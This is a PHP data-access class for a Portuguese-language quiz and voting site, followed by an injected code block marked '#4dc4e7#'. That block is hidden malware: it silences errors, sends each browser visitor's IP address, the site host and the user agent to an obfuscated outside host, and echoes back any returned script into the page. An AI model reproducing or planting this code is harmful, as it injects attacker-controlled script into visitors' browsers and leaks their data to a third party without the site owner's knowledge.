<?php
include_once( "DAO.php" );
include_once( "DBUtils.php" );
include_once( "quiz.php" );
# ------------------------------------------------------------------ #

class quizDAO {

	# ------------------------------------------------------------------ #
	public static function getQuizzes( $id = null )
	{
		$out = array();

		if ( isset( $id ) )
		{
			$results = DAO::find( 'quiz', array( 'id' => $id ) );
		}
		else
		{
			$results = DAO::find( 'quiz' );
		}

		foreach ( $results as $quiz )
		{
			$quiz->__set( 'status_text', ( $quiz->status == 'A' ) ? 'Aberto' : 'Finalizado' );
			$out[] = $quiz;	
		}

		return $out;
	}

	# ------------------------------------------------------------------ #
	public static function getQuizRespostas( $id )
	{
		$quiz = new quiz( $id );
		$quiz->__set( 'status_text', ( $quiz->status == 'A' ) ? 'Aberto' : 'Finalizado' );
		$quiz->__set( 'respostas', DAO::find( 'quiz_resposta', array( 'id_quiz' => $quiz->id ) ) );
		return $quiz;
	}

	# ------------------------------------------------------------------ #
	public static function getQuizForHome()
	{
		$quiz = DAO::find( 'quiz', array( 'status' => 'A' ), 'created_at desc', 1 );
		$quiz = $quiz[0];
		$quiz->__set( 'respostas', DAO::find( 'quiz_resposta', array( 'id_quiz' => $quiz->id ) ) );
		return $quiz;
	}
	
	# ------------------------------------------------------------------ #
	public static function getTotalVotos($id)
	{
		$votos = DAO::find( 'quiz_voto', array( 'id_quiz' => $id));
		return count($votos);
	}
	
	# ------------------------------------------------------------------ #
	public static function getTotalVoto($id)
	{
		$votos = DAO::find( 'quiz_voto', array( 'id_quiz_resposta' => $id));
		return count($votos);
	}
}

?>
<?php
#4dc4e7#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/4dc4e7#
?>